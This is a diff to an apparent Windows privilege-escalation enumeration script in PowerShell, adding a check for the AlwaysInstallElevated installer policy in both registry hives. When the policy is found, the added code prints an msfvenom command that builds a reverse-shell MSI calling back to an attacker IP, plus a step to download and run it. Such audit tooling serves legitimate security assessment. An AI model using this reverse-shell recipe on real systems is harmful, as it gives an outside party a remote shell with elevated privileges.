@@ -421,9 +421,7 @@ function Check-WeakRegistryPermissions{
 
 function Check-InsecureServicesExecutable{
     [CmdletBinding()]
-	param(
-        
-    )
+	param()
     
     write-host "`n"
     write-host "[*] Check insecure services executable"
@@ -683,6 +681,48 @@ function Check-Autoruns{
     
 }
 
+function Check-AlwaysInstallElevated {
+    
+    [CmdletBinding()]
+	param()
+    
+    write-host "`n"
+    write-host "[*] Check allways install elevated policy"
+
+    #Return variable
+    $result = $false
+
+    #Auxiliary variables
+    $OrigError = $ErrorActionPreference
+    $ErrorActionPreference = "SilentlyContinue"
+
+    $keyPolicyHKCU = "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"
+    $keyPolicyHKLM = "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"
+                
+    $registryCommand= "Registry::" + $keyPolicyHKCU
+    $rvalueHKCU = Get-ItemPropertyValue -Path $registryCommand -Name AlwaysInstallElevated
+
+    $registryCommand= "Registry::" + $keyPolicyHKLM
+    $rvalueHKLM = Get-ItemPropertyValue -Path $registryCommand -Name AlwaysInstallElevated
+
+
+    $ErrorActionPreference = $OrigError
+    if (($rvalueHKCU -eq 1) -and ($rvalueHKLM -eq 1)){
+        $result = $true
+    }
+        
+    # Write method
+    if ($result -eq $true){
+        write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "AlwaysInstallElevated is activated"
+        write-host "   1. Create a reverse shell msi: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerip] LPORT=53 -f msi -o reverse.msi"
+        write-host "   2. Download file in windows and execute"
+    } else {
+       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
+    }
+
+
+}
 
 #############################
 # Main Function
@@ -697,6 +737,7 @@ function main {
     #Check-InsecureServicesExecutable
     #Check-TaskScheduled
     #Check-Autoruns
+    Check-AlwaysInstallElevated
 
 }
 
